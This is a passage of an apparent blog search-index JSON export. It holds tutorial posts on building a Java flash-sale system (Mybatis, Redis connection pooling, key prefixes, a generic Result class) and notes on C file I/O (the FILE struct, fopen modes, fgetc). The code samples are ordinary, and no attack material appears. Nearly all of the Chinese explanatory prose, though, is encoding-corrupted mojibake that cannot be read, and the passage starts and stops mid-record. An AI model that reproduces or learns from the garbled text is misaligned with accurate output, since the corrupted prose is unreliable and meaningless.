Exception.class)ï¼Œå®ƒèƒ½å¤Ÿå®ç°å¯¹æ‰€æœ‰å¼‚å¸¸çš„æ¥å—ï¼Œè€Œåœ¨æ–¹æ³•ä¸­ï¼Œå¯¹ä¸åŒçš„å¼‚å¸¸è¿›è¡Œå¤„ç† 6. å…³æ³¨ä¸€ä¸‹å‚æ•°æ›¿æ¢çš„æ–¹æ³• public static CodeMsg BIND_ERROR = new CodeMsg(500101,&quot;å‚æ•°æ ¡éªŒå¼‚å¸¸ï¼š%s&quot;); public CodeMsg fillArgs(Object... args){ int code = this.code; String message = String.format(this.msg, args); return new CodeMsg(code,message); } 1234567 å…¶ä¸­String.format()èƒ½å¤Ÿæ ¹æ®ä¼ å…¥çš„å­—ç¬¦ä¸²æ ¼å¼ï¼Œæ¯”å¦‚â€å‚æ•°æ ¡éªŒå¼‚å¸¸ï¼š%sâ€ï¼Œå…¶ä¸­%sï¼Œèƒ½è¢«ç¬¬äºŒä¸ªä¼ å…¥çš„å‚æ•°è¿›è¡Œæ›¿æ¢ï¼Œä»è€Œå½¢æˆåŠ¨æ€çš„å­—ç¬¦ä¸²","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://blog.kayleh.top/tags/project/"}]},{"title":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ","slug":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ","date":"2020-11-06T04:12:45.000Z","updated":"2021-04-15T15:25:25.124Z","comments":true,"path":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ/","link":"","permalink":"https://blog.kayleh.top/Java%E9%AB%98%E6%80%A7%E8%83%BD%E9%AB%98%E5%B9%B6%E5%8F%91%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F/","excerpt":"","text":"@CSDNæ–¹ åœ†1. é›†æˆMybatis æˆ‘è§‰å¾—åœ¨é›†æˆMybatisæ—¶é—®é¢˜å¹¶ä¸å¤§ 1.1 æ–°æ¥è§¦çš„ä¸ç”¨xmlæ–‡ä»¶å†™Mapperæ–‡ä»¶@Mapper @Component public interface UserMapper { @Select(&quot;select * from user where id = #{id}&quot;) User selectById(@Param(&quot;id&quot;) int id); @Insert(&quot;insert into user (id,name) values (#{id},#{name})&quot;) int insertUser(User user); } æ³¨è§£@Mapperï¼Œæ ‡è®°è¯¥ç±»æ˜¯ä¸€ä¸ªMapper é€šå¸¸ä¹‹å‰åšç»ƒä¹ å†™æ•°æ®åº“çš„CRUDéƒ½æ˜¯åœ¨xmlæ–‡ä»¶ä¸­è¿›è¡Œçš„ï¼Œè¿™æ¬¡é‡‡ç”¨çš„æ˜¯åœ¨å¯¹åº”çš„æ–¹æ³•ä¸Šæ ‡æ³¨æ³¨è§£çš„å½¢å¼ï¼Œ@Select @Insert 1.2 äº‹åŠ¡çš„æµ‹è¯•@Service public class UserService { ... @Transactional public boolean tx(){ User user1 = new User(2,&quot;222&quot;); userMapper.insertUser(user1); User user2 = new User(3,&quot;333&quot;); userMapper.insertUser(user2); return true; } } åœ¨UserServiceä¸­ï¼Œåˆ›å»ºäº†ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨æ¥æµ‹è¯•äº‹åŠ¡ï¼Œç”¨@Transactionalæ ‡è®° 1.3 è‡ªå®šä¹‰ä¸€ä¸ªResultç±»ï¼Œç”¨äºè¿”å›ç»“æœä½¿ç”¨@Data public class Result&lt;T&gt; { private int code; private String msg; private T data; /** * æˆåŠŸæ—¶è°ƒç”¨ */ public static &lt;T&gt; Result&lt;T&gt; success(T data){ return new Result&lt;T&gt;(data); } /** * å¤±è´¥æ—¶è°ƒç”¨ */ public static &lt;T&gt; Result&lt;T&gt; error(T data){ return new Result&lt;T&gt;(data); } private Result(T data){ this.data = data; } private Result(int code,String msg){ this.code = code; this.msg = msg; } private Result(CodeMsg codeMsg){ if(codeMsg != null){ msg = codeMsg.getMsg(); code = codeMsg.getCode(); } } } å®ƒåŒ…å«äº†ä¸‰ä¸ªå­—æ®µï¼Œcodeç”¨æ¥ä¿å­˜çŠ¶æ€ç ï¼ŒmsgçŠ¶æ€ä¿¡æ¯ï¼Œdataæ˜¯è¿”å›çš„å¯¹è±¡ï¼ˆæ³›å‹ï¼‰ public class Result&lt;T&gt; çœ‹ç±»å£°æ˜çš„è¯­å¥ï¼Œå…¶ä¸­ä½¿ç”¨äº†æ³›å‹ï¼Œè¿™è¡¨ç¤ºè¿”å›å¯¹è±¡æ—¶ï¼Œæˆ‘ä»¬å¯¹å…¶ç±»å‹æ˜¯â€œå·²çŸ¥â€çš„ï¼Œä¸å¿…å¼ºè½¬ï¼Œå¢åŠ äº†çµæ´»æ€§ public static &lt;T&gt; Result&lt;T&gt; success(T data){ return new Result&lt;T&gt;(data); } 123 å…¶ä¸­çš„æ–¹æ³•è¯­å¥ï¼Œåœ¨è¿”å›å€¼ä¸­æ ‡è®°äº†æ³›å‹ï¼Œéœ€è¦æˆ‘ä»¬åœ¨å‡½æ•°å®šä¹‰çš„ä¸­åœ¨è¿”å›å€¼å‰åŠ ä¸Šæ ‡è¯†æ³›å‹ï¼Œå¯ä»¥æŠŠå®ƒæƒ³è±¡æˆæ­£å¸¸çš„è¿”å›å€¼ï¼ŒåƒStringç­‰ç­‰ï¼Œåªä¸è¿‡ç”¨Tæ¥è¡¨ç¤ºç½¢äº† ä¸è¿‡ï¼Œåœ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™ç”¨ä¸¤ç§æ–¹æ³• ç›´æ¥è°ƒç”¨ Result.success(&quot;Success&quot;); æ ‡è®°æ³›å‹è°ƒç”¨ï¼ŒResult.success(&quot;Success&quot;); ä¸¤ç§ä½¿ç”¨æ–¹æ³•çš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡ç¬¬äºŒç§æ›´èƒ½çªå‡ºå®ƒæ˜¯æ³›å‹æ–¹æ³•çš„ä½¿ç”¨ï¼Œæ¨èã€‚ private Result(T data){ this.data = data; } 123 æœ€åè¿™ä¸ªå®åœ¨ç®€å•ï¼Œåœ¨æ„é€ æ–¹æ³•å‚æ•°ä¸­ä½¿ç”¨æ³›å‹ï¼Œä¼ ä»€ä¹ˆç±»å‹å°±è‡ªåŠ¨ä¸ºä»€ä¹ˆç±»å‹ã€‚ æœ€åæ€»ç»“ä¸€ä¸‹è¿™ä¸ªResultçš„åŠŸèƒ½1.åœ¨æˆåŠŸå’Œå¤±è´¥çš„æ—¶å€™ç”¨äºç»“æœè¿”å›è¡¨ç¤º2.å¦å¤–å®ƒå¼•å…¥CodeMsgç±»ï¼Œåœ¨CodeMsgç±»ä¸­ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰äº†ä¸€äº›çŠ¶æ€ç å’ŒçŠ¶æ€ä¿¡æ¯ï¼Œç”¨èµ·æ¥ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ ä¸‹é¢æ˜¯CodeMsgç±»çš„ä»£ç  @Data @AllArgsConstructor @NoArgsConstructor public class CodeMsg { private int code; private String msg; //é€šç”¨é”™è¯¯ç  public static CodeMsg SUCCESS = new CodeMsg(0,&quot;success&quot;); ... } Javaæ³›å‹è¯¦è§£ï¼šå’ŒClassçš„ä½¿ç”¨ã€‚æ³›å‹ç±»ï¼Œæ³›å‹æ–¹æ³•çš„è¯¦ç»†ä½¿ç”¨å®ä¾‹ 2. é›†æˆRedis2.1 ä¸æœåŠ¡å™¨çš„Rediså»ºç«‹è¿æ¥æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„æ˜¯è¦åˆ›å»ºå‡ºJedisPoolï¼Œç”¨æ¥åˆ›å»ºå‡ºJedisä¸æœåŠ¡å™¨ä¸­Redisè¿›è¡Œäº¤äº’ é¦–å…ˆï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶application.propertiesä¸­å†™å¥½é…ç½®ä¿¡æ¯ï¼Œæ¯”å¦‚ä¸»æœºåœ°å€ã€ç«¯å£å·ã€æœ€å¤§è¿æ¥æ•°ç­‰ç­‰ redis.host=182.xxx.xxx.xxx redis.port=6379 redis.timeout=3 redis.poolMaxTotal=10 redis.poolMaxIdle=10 redis.poolMaxWait=3 123456 å†™å¥½é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬è¦å¯¹å…¶è¿›è¡Œè¯»å–ï¼Œåˆ›å»ºè¯»å–é…ç½®ä¿¡æ¯çš„é…ç½®ç±» @Data @Component //è¯»å–é…ç½®æ–‡ä»¶çš„æ³¨è§£,æŒ‡å®šå‰ç¼€ï¼Œè¯»ä»¥redisæ‰“å¤´çš„ @ConfigurationProperties(prefix = &quot;redis&quot;) public class RedisConfig { private String host; private int port; private int timeout; private int poolMaxTotal; private int poolMaxIdle; private int poolMaxWait; } 123456789101112 æ³¨æ„æ³¨è§£@ConfigurationProperties(prefix = &quot;redis&quot;)ï¼Œç”¨æ¥è¯»å–å‰ç¼€æ˜¯redisçš„é…ç½®ä¿¡æ¯ï¼Œå­—æ®µä¸è¦è¯»å–çš„ä¿¡æ¯ä¸€è‡´ æ¥ä¸‹æ¥å°±æ˜¯è¦åˆ›å»ºJedisPool @Service public class JedisPoolFactory { @Autowired RedisConfig redisConfig; @Bean public JedisPool jedisPool(){ JedisPoolConfig jedisPoolConfig = new JedisPoolConfig(); jedisPoolConfig.setMaxIdle(redisConfig.getPoolMaxIdle()); jedisPoolConfig.setMaxTotal(redisConfig.getPoolMaxTotal()); jedisPoolConfig.setEvictorShutdownTimeoutMillis(redisConfig.getTimeout() * 1000); return new JedisPool(jedisPoolConfig, redisConfig.getHost(),redisConfig.getPort(),redisConfig.getTimeout() * 1000); } } 12345678910111213141516 RedisConfigï¼Œä½œä¸ºBeanè‡ªåŠ¨è£…é…è¿›æ¥ï¼Œæˆ‘ä»¬è¿˜è¦å»ºç«‹JedisPoolConfigæ¥è®¾ç½®ä¸€äº›å‚æ•°ï¼Œä¾›å»ºç«‹JedisPoolæ—¶è¯»å– ä»¥ä¸Šï¼Œå®Œæˆäº†ä¸æœåŠ¡å™¨Redisçš„å»ºç«‹è¿æ¥è¿‡ç¨‹ 2.2 Keyå‰ç¼€çš„å¿…è¦æ¯•ç«Ÿæˆ‘ä»¬è¿™ä¸ªæ˜¯é«˜å¹¶å‘çš„é¡¹ç›®ï¼Œé‚£ä¹ˆå¤šä¸ªäººåœ¨å¯¹åŒä¸€ä¸ªkeyè¿›è¡Œè¯»å–æ—¶ï¼Œå¦‚æœä¸å¯¹keyå€¼è¿›è¡Œä¿®é¥°ï¼Œå¾ˆå®¹æ˜“å‘ç”Ÿæ•°æ®æŸåï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬é‡‡ç”¨äº†å‰ç¼€ä¿®é¥°ï¼Œåœ¨è®¾è®¡æ¨¡å¼ä¸­ï¼Œæ˜¯å¯¹æ¨¡æ¿æ–¹æ³•æ¨¡å¼çš„åº”ç”¨ åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° å…ˆåˆ›å»ºä¸€ä¸ªæ¥å£ï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼Œè·å¾—å¤±æ•ˆæ—¶é—´å’Œè·å–å‰ç¼€ public interface KeyPrefix { //æ·»åŠ å¤±æ•ˆæ—¶é—´ int expireSeconds(); //è·å–å‰ç¼€ String getPrefix(); } 123456 éšåï¼Œæˆ‘ä»¬åˆ›å»ºçš„æ˜¯æŠ½è±¡ç±»ï¼Œå®ƒå°±åƒæ˜¯ä¸€ä¸ªæ¨¡æ¿ï¼Œä¸ºå…¶ä»–å®ç°è¯¥æŠ½è±¡ç±»çš„å­ç±»ï¼Œå»ºç«‹äº†ä¸€ä¸ªæ¨¡æ¿ï¼ˆæˆ‘åœ¨è¯´ä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿåº”è¯¥ä¼ è¾¾æ¸…æ¥šäº†ï¼‰æˆ‘ä»¬å¯¹æ¥å£ä¸­çš„æ–¹æ³•è¿›è¡Œå…¨éƒ¨é‡å†™ï¼Œå…¶ä¸­è·å–å‰ç¼€æ—¶ï¼Œå‰ç¼€ä¸ºç±»åï¼Œæä¾›ä¸¤ç§æ„é€ å‡½æ•°ï¼Œä¸€ç§ä¸ºæ— å¤±æ•ˆæ—¶é—´çš„ï¼Œå¦ä¸€ç§ä¸ºæœ‰å¤±æ•ˆæ—¶é—´çš„ æŠ½è±¡ç±»ä¸­æ„é€ æ–¹æ³•çš„ç†è§£ï¼šå…¶ä¸­çš„æ„é€ æ–¹æ³•ä¸æ™®é€šç±»ä¸­çš„æ„é€ æ–¹æ³•é•¿å¾—ä¸€æ ·ï¼Œä¸è¿‡å®ƒä¸èƒ½ç”¨æ¥æ„é€ è‡ªå·±ï¼Œå› ä¸ºå®ƒæ˜¯æŠ½è±¡çš„ï¼Œä¸èƒ½å®ä¾‹åŒ–ï¼Œä½†æ˜¯ä¸€æ—¦å­ç±»å®ç°äº†è¯¥æŠ½è±¡ç±»ï¼Œé‚£ä¹ˆå­ç±»ä¾¿å¯ä»¥è°ƒç”¨å…¶æŠ½è±¡ç±»çš„æ„é€ å‡½æ•°è¿›è¡Œå®ä¾‹åŒ– public abstract class BasePrefix implements KeyPrefix{ private int expireSecond; private String prefix; public BasePrefix(String prefix){ this(0,prefix); } public BasePrefix(int expireSecond,String prefix){ this.expireSecond = expireSecond; this.prefix = prefix; } @Override public int expireSeconds(){ return expireSecond; } @Override public String getPrefix() { //è·å–å‰ç¼€ï¼Œå‰é¢æ·»åŠ ç±»å return getClass().getSimpleName() + &quot;:&quot; + prefix; } } 12345678910111213141516171819202122232425 æœ€åï¼Œå±•ç°å‡ºæŠ½è±¡ç±»çš„å®ç°ç±» public class UserKey extends BasePrefix { public UserKey(String prefix) { super(prefix); } //UserKeyçš„ä¸¤ç§å‰ç¼€å½¢å¼ï¼Œä¸€ç§æ˜¯æ ¹æ®idå¦ä¸€ç§æ ¹æ®name public static UserKey getById = new UserKey(&quot;id&quot;); public static UserKey getByName = new UserKey(&quot;name&quot;); } 12345678910 å®ƒçš„æ„é€ å‡½æ•°å°±æ˜¯ç”¨çš„æŠ½è±¡çˆ¶ç±»ä¸­çš„æ„é€ å‡½æ•°ï¼Œè€Œä¸”å®šä¹‰äº†ä¸¤ä¸ªé™æ€å­—æ®µï¼Œä¸€ç§æ˜¯æ ¹æ®Idæ¥ç”Ÿæˆå‰ç¼€ï¼Œå‰ç¼€æ ¼å¼ä¼šæ ¹æ®getPrefix()æ–¹æ³•ï¼Œè¡¨ç¤ºä¸ºç±»å+ï¼š+id 2.3 ç®€å•çœ‹RedisServiceä¸­çš„ä¸€ä¸ªæ–¹æ³•@Service public class RedisService { @Autowired JedisPool jedisPool; public &lt;T&gt; boolean set(KeyPrefix keyPrefix,String key,T value){ //è·å–Jediså¯¹è±¡ Jedis jedis = null; try { jedis = jedisPool.getResource(); String str = beanToString(value); if(str == null || str.length() &lt;= 0){ return false; } String realKey = keyPrefix.getPrefix() + key; int seconds = keyPrefix.expireSeconds(); if(seconds &lt;= 0){ jedis.set(realKey,str); }else{ //è®¾ç½®è¶…æ—¶æ—¶é—´ jedis.setex(realKey,seconds,str); } return true; }finally { returnToPool(jedis); } } ... } 1234567891011121314151617181920212223242526272829303132 æ ¹æ®è‡ªåŠ¨è£…é…è·å–JedisPoolï¼Œç”¨Jedisè¿æ¥æ± æ¥æ‹¿å‡ºJedisä¸RedisæœåŠ¡å™¨å»ºç«‹è¿æ¥ã€‚ setæ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦å°†valueå€¼è½¬æ¢ä¸ºStringç±»å‹ï¼Œè®©Redisèƒ½å¤Ÿè¯†åˆ« éšåï¼Œä¸ºkeyæ·»åŠ å‰ç¼€ï¼Œç”ŸæˆrealKeyï¼›è·å–å…¶ä¸­çš„å¤±æ•ˆæ—¶é—´ æ ¹æ®å¤±æ•ˆæ—¶é—´æ¥åˆ¤æ–­æ˜¯å¦éœ€è¦è°ƒç”¨setex()æ–¹æ³• 2.4 beanToStringä¸stringToBeanæ–¹æ³• private &lt;T&gt; String beanToString(T value){ if(value == null){ return null; } //è¿›è¡Œç±»å‹åˆ¤æ–­ï¼Œè¿™é‡Œç”¨åˆ°äº†ï¼Ÿé€šé…ç¬¦ Class&lt;?&gt; clazz = value.getClass(); if(clazz == int.class || clazz == Integer.class){ return &quot;&quot; + value; }else if(clazz == long.class || clazz == Long.class){ return &quot;&quot; + value; }else if(clazz == String.class){ return (String)value; }else{ //å¦‚æœæ˜¯å¯¹è±¡çš„è¯ï¼Œç”¨JSONçš„é™æ€æ–¹æ³•è½¬String return JSON.toJSONString(value); } } 1234567891011121314151617 @SuppressWarnings(&quot;unchecked&quot;) private &lt;T&gt; T stringToBean(String str,Class&lt;T&gt; clazz){ if(str == null || str.length() &lt;= 0 || clazz == null){ return null; } if(clazz == int.class || clazz == Integer.class){ return (T) Integer.valueOf(str); }else if(clazz == long.class || clazz == Long.class){ return (T) Long.valueOf(str); }else if(clazz == String.class){ return (T) str; }else{ //è½¬åŒ–æˆå¯¹è±¡çš„JSONé™æ€æ–¹æ³• return JSON.toJavaObject(JSON.parseObject(str),clazz); } } 1234567891011121314151617 æ³¨è§£@SupressWarings(&quot;unchecked&quot;)ï¼Œé•‡å‹è­¦å‘Š","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://blog.kayleh.top/tags/project/"}]},{"title":"file input and output","slug":"10.file-input-and-output","date":"2020-11-03T10:24:07.000Z","updated":"2021-04-11T17:11:28.066Z","comments":true,"path":"10.file-input-and-output/","link":"","permalink":"https://blog.kayleh.top/10.file-input-and-output/","excerpt":"","text":"å¯¹æ–‡ä»¶çš„è¾“å…¥è¾“å‡ºæ–‡ä»¶ ç¨‹åºæ–‡ä»¶ã€‚åŒ…æ‹¬æºç¨‹åºæ–‡ä»¶ï¼Œè¿™ç§æ–‡ä»¶çš„å†…å®¹æ˜¯ç¨‹åºä»£ç  æ•°æ®æ–‡ä»¶ã€‚ä¾›ç¨‹åºè¿è¡Œæ—¶è¯»å†™çš„æ•°æ® æ“ä½œç³»ç»ŸæŠŠå„ç§è®¾å¤‡éƒ½ç»Ÿä¸€ä½œä¸ºæ–‡ä»¶æ¥å¤„ç†ã€‚ æ–‡ä»¶ä¸€èˆ¬æŒ‡å­˜å‚¨åœ¨å¤–éƒ¨ä»‹è´¨ä¸Šæ•°æ®çš„é›†åˆã€‚ æµ(æ•°æ®æµ)æ•°æ®çš„è¾“å…¥è¾“å‡º.æµè¡¨ç¤ºäº†ä¿¡æ¯ä»æºåˆ°ç›®çš„åœ°çš„æµåŠ¨. æ–‡ä»¶åæ–‡ä»¶è·¯å¾„+æ–‡ä»¶åä¸»å¹²+æ–‡ä»¶åç¼€ æ–‡ä»¶çš„åˆ†ç±» ASCIIæ–‡ä»¶,åœ¨å­˜å‚¨å‰éœ€è¦è½¬æ¢,æ–‡æœ¬æ–‡ä»¶ äºŒè¿›åˆ¶æ–‡ä»¶,å­˜å‚¨åœ¨å†…å­˜çš„æ•°æ®çš„æ˜ è±¡,ä¸éœ€è¦åŠ ä»¥è½¬æ¢è¾“å‡ºåˆ°å¤–å­˜,ç§°ä¸ºæ˜ åƒæ–‡ä»¶. æ–‡ä»¶ç¼“å†²åŒº ANSI Cæ ‡å‡†é‡‡ç”¨â€œç¼“å†²æ–‡ä»¶ç³»ç»Ÿâ€å¤„ç†æ•°æ®æ–‡ä»¶ã€‚ æ‰€è°“ç¼“å†²æ–‡ä»¶ç³»ç»Ÿæ˜¯æŒ‡ç³»ç»Ÿè‡ªåŠ¨åœ°åœ¨å†…å­˜åŒºä¸ºç¨‹åºä¸­æ¯ä¸€ä¸ªæ­£åœ¨ä½¿ç”¨çš„æ–‡ä»¶å¼€è¾Ÿä¸€ä¸ªæ–‡ä»¶ç¼“å†²åŒºä»å†…å­˜å‘ç£ç›˜è¾“å‡ºæ•°æ®å¿…é¡»å…ˆé€åˆ°å†…å­˜ä¸­çš„ç¼“å†²åŒºï¼Œè£…æ»¡ç¼“å†²åŒºåæ‰ä¸€èµ·é€åˆ°ç£ç›˜å»ã€‚ å¦‚æœä»ç£ç›˜å‘è®¡ç®—æœºè¯»å…¥æ•°æ®ï¼Œåˆ™ä¸€æ¬¡ä»ç£ç›˜æ–‡ä»¶å°†ä¸€æ‰¹æ•°æ®è¾“å…¥åˆ°å†…å­˜ç¼“å†²åŒº(å……æ»¡ç¼“å†²åŒº)ï¼Œç„¶åå†ä»ç¼“å†²åŒºé€ä¸ªåœ°å°†æ•°æ®é€åˆ°ç¨‹åºæ•°æ®åŒº(ç»™ç¨‹åºå˜é‡) ã€‚ ç¨‹åºä¸ç£ç›˜ä¹‹é—´äº¤äº’ï¼Œä¸æ˜¯ç«‹å³å®Œæˆï¼Œç³»ç»Ÿæˆ–ç¨‹åºå¯æ ¹æ®éœ€è¦è®¾ç½®ç¼“å†²åŒºï¼Œä»¥æé«˜å­˜å–æ•ˆç‡ æ–‡ä»¶ç±»å‹æŒ‡é’ˆå¯¹äºæ“ä½œç³»ç»Ÿè€Œè¨€,å…³é”®çš„æ¦‚å¿µæ˜¯â€æ–‡ä»¶æŒ‡é’ˆâ€.æ¯ä¸ªè¢«ä½¿ç”¨çš„æ–‡ä»¶éƒ½åœ¨å†…å­˜ä¸­å¼€è¾Ÿä¸€æ®µå­˜å‚¨å•å…ƒ,ç”¨æ¥å­˜æ”¾æ–‡ä»¶çš„æœ‰å…³ä¿¡æ¯.è¿™äº›ä¿¡æ¯æ˜¯ä¿å­˜åœ¨ä¸€ä¸ªç»“æ„ä½“å˜é‡ä¸­çš„.è¯¥ç»“æ„ä½“ç±»å‹å˜é‡æ˜¯ç”±ç³»ç»Ÿå®šä¹‰çš„,å–åä¸ºFILE.æœ‰å‡ ä¸ªæ–‡ä»¶å°±å»ºç«‹å‡ ä¸ªè¿™æ ·çš„ç»“æ„ä½“å˜é‡,åˆ†åˆ«å­˜æ”¾å„æ–‡ä»¶çš„æœ‰å…³ä¿¡æ¯.åŒæ—¶è¿”å›å¯¹åº”çš„FILEç»“æ„æŒ‡é’ˆ. FILEç»“æ„ä½“ç±»å‹åœ¨stdio.hæ–‡ä»¶ä¸­å®šä¹‰å¦‚ä¸‹: Typedef struct { short level; //ç¼“å†²åŒºâ€æ»¡â€æˆ–â€ç©ºâ€çš„ç¨‹åº¦// unsigned flags; //æ–‡ä»¶çŠ¶æ€æ ‡å¿—// char fd; //æ–‡ä»¶æè¿°ç¬¦// unsigned char hold; //å¦‚æ— ç¼“å†²åŒºä¸è¯»å–å­—ç¬¦// short bsize; //ç¼“å†²åŒºå¤§å°// unsigned char *buffer; //æ•°æ®ç¼“å†²åŒºçš„ä½ç½®// unsigned char *curp; //æŒ‡é’ˆ,å½“å‰æŒ‡å‘// unsigned istemp; //ä¸´æ—¶æ–‡ä»¶,æŒ‡ç¤ºå™¨// short token; //ç”¨äºæœ‰æ•ˆæ€§æ£€æŸ¥// }FILE; å®šä¹‰ä¸€ä¸ªæŒ‡å‘æ–‡ä»¶å‹æ•°æ®çš„æŒ‡é’ˆå˜é‡ FILE *fp; å¯ä»¥ä½¿fpæŒ‡å‘æŸä¸€ä¸ªæ–‡ä»¶çš„æ–‡ä»¶ä¿¡æ¯åŒº(æ˜¯ä¸€ä¸ªç»“æ„ä½“å˜é‡),é€šè¿‡è¯¥æ–‡ä»¶ä¿¡æ¯åŒºä¸­çš„ä¿¡æ¯å°±èƒ½å¤Ÿè®¿é—®è¯¥æ–‡ä»¶. é€šè¿‡æ–‡ä»¶æŒ‡é’ˆå˜é‡èƒ½å¤Ÿæ‰¾åˆ°ä¸å®ƒå…³è”çš„æ–‡ä»¶,å¦‚æœæœ‰nä¸ªæ–‡ä»¶,åº”è®¾nä¸ªæŒ‡é’ˆå˜é‡,åˆ†åˆ«æŒ‡å‘nä¸ªFILEç±»å‹å˜é‡,ä»¥å®ç°å¯¹nä¸ªæ–‡ä»¶çš„è®¿é—®. é€šå¸¸å°†è¿™ç§æŒ‡å‘æ–‡ä»¶ä¿¡æ¯åŒºçš„æŒ‡é’ˆå˜é‡ç®€ç§°ä¸ºæŒ‡å‘æ–‡ä»¶çš„æŒ‡é’ˆå˜é‡ å¹¶ä¸æ˜¯æŒ‡å‘å¤–éƒ¨ä»‹è´¨ä¸Šçš„æ•°æ®æ–‡ä»¶çš„å¼€å¤´,è€Œæ˜¯æŒ‡å‘å†…å­˜ä¸­çš„æ–‡ä»¶ä¿¡æ¯åŒºçš„å¼€å¤´. æ‰“å¼€ä¸å…³é—­æ–‡ä»¶â€œæ‰“å¼€â€æŒ‡ä¸ºæ–‡ä»¶å»ºç«‹ç›¸åº”çš„ä¿¡æ¯åŒº(ç”¨æ¥å­˜æ”¾æœ‰å…³æ–‡ä»¶çš„ä¿¡æ¯)å’Œæ–‡ä»¶ç¼“å­˜åŒº(ç”¨æ¥æš‚æ—¶å­˜æ”¾è¾“å…¥è¾“å‡ºçš„æ•°æ®). æ‰“å¼€æ–‡ä»¶çš„åŒæ—¶,ä¸€èˆ¬æŒ‡å®šä¸€ä¸ªæŒ‡é’ˆå˜é‡æŒ‡å‘è¯¥æ–‡ä»¶,å»ºç«‹èµ·æŒ‡é’ˆå˜é‡ä¸æ–‡ä»¶ä¹‹é—´çš„è”ç³». ç”¨fopenå‡½æ•°æ‰“å¼€æ•°æ®æ–‡ä»¶fopen(æ–‡ä»¶å,ä½¿ç”¨æ–‡ä»¶æ–¹å¼) FILE *fp; fp=fopen(&quot;a1&quot;,&quot;r&quot;); å®ç°å¤±è´¥è¿”å›NULL. ä½¿ç”¨æ–‡ä»¶æ–¹å¼. æ‰“å¼€æ–¹å¼ å«ä¹‰ æŒ‡å®šæ–‡ä»¶ä¸å­˜åœ¨æ—¶ æŒ‡å®šæ–‡ä»¶å­˜åœ¨æ—¶ r åªè¯»æ–¹å¼æ‰“å¼€æ–‡æœ¬æ–‡ä»¶ å‡ºé”™ æ­£å¸¸æ‰“å¼€ w åªå†™æ–¹å¼æ‰“å¼€æ–‡æœ¬æ–‡ä»¶ å»ºç«‹æ–°æ–‡ä»¶ æ–‡ä»¶åŸæœ‰å†…å®¹ä¸¢å¤± a è¿½åŠ æ–¹å¼æ‰“å¼€æ–‡æœ¬æ–‡ä»¶ å»ºç«‹æ–°æ–‡ä»¶ åœ¨åŸæœ‰å†…å®¹æœ«å°¾è¿½åŠ  r+ è¯»/å†™æ–¹å¼æ‰“å¼€æ–‡æœ¬æ–‡ä»¶ å‡ºé”™ æ­£å¸¸æ‰“å¼€ w+ è¯»/å†™æ–¹å¼åˆ›å»ºæ–°çš„æ–‡æœ¬æ–‡ä»¶ å»ºç«‹æ–°æ–‡ä»¶ æ–‡ä»¶åŸæœ‰å†…å®¹ä¸¢å¤± a+ è¯»/è¿½åŠ æ–¹å¼å»ºç«‹æ–°çš„æ–‡æœ¬æ–‡ä»¶ å»ºç«‹æ–°æ–‡ä»¶ åœ¨åŸæœ‰å†…å®¹æœ«å°¾è¿½åŠ  rb åªè¯»æ–¹å¼æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ å‡ºé”™ æ­£å¸¸æ‰“å¼€ wb åªå†™æ–¹å¼æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ å»ºç«‹æ–°æ–‡ä»¶ æ–‡ä»¶åŸæœ‰å†…å®¹ä¸¢å¤± ab è¿½åŠ æ–¹å¼æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ å»ºç«‹æ–°æ–‡ä»¶ åœ¨åŸæœ‰å†…å®¹æœ«å°¾æ·»åŠ  rb+ è¯»/å†™æ–¹å¼æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ å‡ºé”™ æ­£å¸¸æ‰“å¼€ wb+ è¯»/å†™æ–¹å¼åˆ›å»ºæ–°çš„äºŒè¿›åˆ¶æ–‡ä»¶ å»ºç«‹æ–°æ–‡ä»¶ æ–‡ä»¶åŸæœ‰å†…å®¹ä¸¢å¤± ab+ è¯»/è¿½åŠ æ–¹å¼åˆ›å»ºæ–°çš„äºŒè¿›åˆ¶æ–‡ä»¶ å»ºç«‹æ–°æ–‡ä»¶ åœ¨åŸæœ‰å†…å®¹æœ«å°¾è¿½åŠ  å¸¦båŒºåˆ«åœ¨äºæ¢è¡Œçš„å¤„ç† ç”¨fcloseå‡½æ•°å…³é—­æ•°æ®æ–‡ä»¶fclose(æ–‡ä»¶æŒ‡é’ˆ); fclose(fp); å…ˆæŠŠç¼“å†²åŒºä¸­çš„æ•°æ®è¾“å‡ºåˆ°ç£ç›˜æ–‡ä»¶,ç„¶åæ‰æ’¤é”€æ–‡ä»¶ä¿¡æ¯åŒº. é¡ºåºè¯»å†™æ•°æ®æ–‡ä»¶æ€æ ·å‘æ–‡ä»¶è¯»å†™å­—ç¬¦è¯»å†™ä¸€ä¸ªå­—ç¬¦çš„å‡½æ•°. å‡½æ•°å è°ƒç”¨å½¢å¼ åŠŸèƒ½ è¿”å›å€¼ fgetc fgetc(fp) ä»fpæŒ‡å‘çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ è¯»æˆåŠŸ,å¸¦å›æ‰€è¯»çš„å­—ç¬¦,å¤±è´¥äº†åˆ™è¿”å›æ–‡ä»¶ç»“æŸæ ‡å¿—EOF(å³-1) fputc fputc(ch,fp) æŠŠå­—ç¬¦chå†™åˆ°æ–‡ä»¶æŒ‡é’ˆå˜é‡fpæ‰€æŒ‡å‘çš„æ–‡ä»¶ä¸­ 